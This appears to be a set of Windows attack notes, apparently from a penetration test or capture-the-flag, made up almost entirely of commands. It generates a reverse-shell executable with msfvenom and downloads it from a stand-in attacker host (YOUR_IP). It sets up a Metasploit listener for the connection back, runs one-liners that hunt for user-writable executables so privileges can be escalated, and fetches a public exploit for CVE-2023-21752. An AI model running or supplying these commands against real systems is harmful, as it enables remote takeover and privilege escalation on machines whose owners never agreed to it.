msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o rev.exe

powershell -c "IEX(New-Object Net.WebClient).DownloadFile('http://YOUR_IP/rev.exe','rev.exe')"

msfconsole
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp   # hoặc meterpreter nếu dùng
set LHOST YOUR_IP
set LPORT 4444
run


rev.exe

for /r C:\ %i in (*.exe) do @icacls "%i" 2>nul | findstr /I /R "(F)\|(M)\|(WD)" | findstr /I "%USERNAME%"

Get-ChildItem C:\ -Recurse -Include *.exe -ErrorAction SilentlyContinue |
ForEach-Object {
    $acl = icacls $_.FullName 2>$null
    if ($acl -match "$env:USERNAME.*\((F|M|WD)\)" -or
        $acl -match "Authenticated Users.*\((F|M|WD)\)" -or
        $acl -match "BUILTIN\\Users.*\((F|M|WD)\)") {
        $_.FullName
    }
}


powershell -Command "Invoke-WebRequest -Uri 'https://github.com/nu11secur1ty/CVE-mitre/raw/main/2023/CVE-2023-21752/PoC/Release/PoC-CVE-2023-21752.exe' -OutFile 'C:\Temp\PoC-CVE-2023-21752.exe'"
